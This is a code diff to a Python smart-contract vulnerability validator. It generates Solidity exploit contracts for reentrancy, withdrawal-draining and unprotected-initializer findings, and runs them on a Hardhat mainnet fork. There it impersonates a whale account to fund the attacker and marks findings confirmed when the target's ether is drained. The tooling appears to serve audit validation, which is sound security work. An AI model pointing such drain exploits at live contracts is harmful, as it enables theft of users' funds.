@@ -344,13 +344,21 @@ class HardhatValidator:
         self.rpc_urls = rpc_urls or self.DEFAULT_RPC_URLS
         os.makedirs(self.exploit_dir, exist_ok=True)
 
-    def _generate_exploit_contract(self, target_addr: str, finding_name: str, finding_type: str) -> str:
+    def _generate_exploit_contract(self, target_addr: str, finding_name: str, finding_type: str, index: int = 0) -> str:
         """Generate a Solidity exploit contract for a given finding type.
+
+        Args:
+            target_addr: Contract address to attack
+            finding_name: Human-readable finding name (for logging)
+            finding_type: Finding type/key used to select the exploit template
+            index: Unique index to prevent contract name collisions across findings
 
         Returns the Solidity source code as a string.
         """
         # Common exploit template with different attack patterns
-        timestamp = int(datetime.utcnow().timestamp())
+        # Use a unique name based on index to avoid name collisions at compile time.
+        # Name format: Exploit_N (where N is the finding's index in the list)
+        contract_name = f"Exploit_{index}"
 
         if "reentrancy" in finding_type.lower():
             return (
@@ -360,7 +368,7 @@ class HardhatValidator:
                 f"    function withdraw(uint256 amount) external;\n"
                 f"    function deposit() external payable;\n"
                 f"}}\n\n"
-                f"contract Exploit_{timestamp} {{\n"
+                f"contract {contract_name} {{\n"
                 f"    ITarget public target;\n"
                 f"    address public owner;\n"
                 f"    uint256 public round;\n"
@@ -396,7 +404,7 @@ class HardhatValidator:
                 f"    function withdraw(uint256 amount) external;\n"
                 f"    function withdrawAll() external;\n"
                 f"}}\n\n"
-                f"contract Exploit_{timestamp} {{\n"
+                f"contract {contract_name} {{\n"
                 f"    ITarget public target;\n"
                 f"    address public owner;\n\n"
                 f"    constructor(address _target) {{\n"
@@ -421,7 +429,7 @@ class HardhatValidator:
                 f"interface ITarget {{\n"
                 f"    function initialize(address _owner) external;\n"
                 f"}}\n\n"
-                f"contract Exploit_{timestamp} {{\n"
+                f"contract {contract_name} {{\n"
                 f"    ITarget public target;\n\n"
                 f"    constructor(address _target) {{\n"
                 f"        target = ITarget(_target);\n"
@@ -436,13 +444,16 @@ class HardhatValidator:
             return (
                 f"// SPDX-License-Identifier: UNLICENSED\n"
                 f"pragma solidity ^0.8.0;\n\n"
-                f"contract Exploit_{timestamp} {{\n"
-                f"    address public target;\n\n"
+                f"contract {contract_name} {{\n"
+                f"    address public target;\n"
+                f"    bool public attacked;\n\n"
                 f"    constructor(address _target) {{\n"
                 f"        target = _target;\n"
                 f"    }}\n\n"
-                f"    function attack() external pure returns (string memory) {{\n"
-                f"        return \"Generic exploit for \";\n"
+                f"    function attack() external {{\n"
+                f"        // Write to storage to make this a real transaction (not view/pure)\n"
+                f"        // This ensures ethers v6 returns a TransactionResponse, not a string\n"
+                f"        attacked = true;\n"
                 f"    }}\n"
                 f"}}\n"
             )
@@ -509,6 +520,13 @@ main().catch(e => {{
         One fork, one compile, one Hardhat run — tests N findings in series.
         Reports per-finding via indexed FINDING_RESULT lines to avoid name collisions.
 
+        Key fixes:
+        - Funds the attacker via whale impersonation (critical: default Hardhat accounts
+          have NO ETH on a fork)
+        - Uses non-view attack functions to ensure ethers v6 returns TransactionResponse
+        - Each attack wrapped in try-catch so one failure doesn't block others
+        - process.exit(0) at the end to prevent hanging
+
         Args:
             target_addr: Contract address to attack
             rpc_url: RPC URL for the chain
@@ -524,19 +542,20 @@ main().catch(e => {{
         const inst{i} = await Factory{i}.deploy(targetAddr);
         await inst{i}.waitForDeployment();
 
-        const balPre{i} = await hre.network.provider.send("eth_getBalance", [targetAddr, "latest"]);
+        const balPre{i} = await ethers.provider.getBalance(targetAddr);
         const tx{i} = await inst{i}.attack({{ gasLimit: 500000 }});
         await tx{i}.wait();
-        const balPost{i} = await hre.network.provider.send("eth_getBalance", [targetAddr, "latest"]);
+        const balPost{i} = await ethers.provider.getBalance(targetAddr);
 
-        const drained = BigInt(balPre{i}) - BigInt(balPost{i});
+        const drained = balPre{i} - balPost{i};
         if (drained > 0n) {{
             console.log(`FINDING_RESULT:{i}|{safe_name}|CONFIRMED|Drained ${{drained.toString()}} wei`);
         }} else {{
             console.log(`FINDING_RESULT:{i}|{safe_name}|FAILED|No funds drained`);
         }}
     }} catch (e) {{
-        console.log(`FINDING_RESULT:{i}|{safe_name}|FAILED|${{e.message?.substring(0, 200) || "Unknown error"}}`);
+        const msg = (e && e.message) ? e.message.substring(0, 200) : (e ? String(e).substring(0, 200) : "Unknown error");
+        console.log(`FINDING_RESULT:{i}|{safe_name}|FAILED|${{msg}}`);
     }}""")
 
         attacks_block = "\n".join(attacks_js)
@@ -560,20 +579,42 @@ async function main() {{
     }});
     console.log("FORK_READY");
 
-    // 2. Record initial balance
-    const initialBal = await hre.network.provider.send("eth_getBalance", [targetAddr, "latest"]);
-    console.log("BALANCE_BEFORE:", BigInt(initialBal).toString());
+    // 2. Fund the attacker account (IMPORTANT: Hardhat signer has no ETH on fork!)
+    const [signer] = await ethers.getSigners();
+    try {{
+        const whaleAddr = "0xF977814e90dA44bFA03b6295A0616a897441aceC";
+        await hre.network.provider.request({{
+            method: "hardhat_impersonateAccount",
+            params: [whaleAddr]
+        }});
+        const whaleSigner = await ethers.getSigner(whaleAddr);
+        await whaleSigner.sendTransaction({{
+            to: signer.address,
+            value: ethers.parseEther("50.0")
+        }});
+        await hre.network.provider.request({{
+            method: "hardhat_stopImpersonatingAccount",
+            params: [whaleAddr]
+        }});
+        console.log("ATTACKER_FUNDED: 50 ETH");
+    }} catch (e) {{
+        console.log("ATTACKER_FUND_WARN: " + (e.message || String(e)).substring(0, 100));
+    }}
 
-    // 3. Test each finding sequentially
+    // 3. Record initial balance
+    const initialBal = await ethers.provider.getBalance(targetAddr);
+    console.log("BALANCE_BEFORE:", initialBal.toString());
+
+    // 4. Test each finding sequentially
 {attacks_block}
 
-    // 4. Final balance
-    const finalBal = await hre.network.provider.send("eth_getBalance", [targetAddr, "latest"]);
-    console.log("BALANCE_AFTER:", BigInt(finalBal).toString());
+    // 5. Final balance
+    const finalBal = await ethers.provider.getBalance(targetAddr);
+    console.log("BALANCE_AFTER:", finalBal.toString());
     console.log("COMBINED_DONE");
 }}
 
-main().catch(e => {{
+main().then(() => process.exit(0)).catch(e => {{
     console.error("FATAL:", e.message);
     process.exit(1);
 }});
@@ -780,10 +821,11 @@ main().catch(e => {{
 
         try:
             # 1. Generate ALL exploit .sol files (one per finding, named differently)
+            #    Each gets a unique index to prevent contract name collisions at compile time
             exploit_contracts: list[tuple[str, str, str]] = []  # (finding_name, contract_name, sol_code)
-            for finding in findings:
+            for idx, finding in enumerate(findings):
                 sol_code = self._generate_exploit_contract(
-                    contract_addr, finding["finding_name"], finding["finding_name"]
+                    contract_addr, finding["finding_name"], finding["finding_name"], index=idx
                 )
                 name_match = re.search(r"contract\s+(\w+)", sol_code)
                 contract_name = name_match.group(1) if name_match else "Exploit"
@@ -1066,7 +1108,6 @@ class Guardian:
             # Skip if already scanned (and not force)
             if not force and self.db.is_scanned(addr, chain_id):
                 logger.info(f"  -> Deja dans la DB, skip")
-                skipped += 1
                 continue
 
             try:
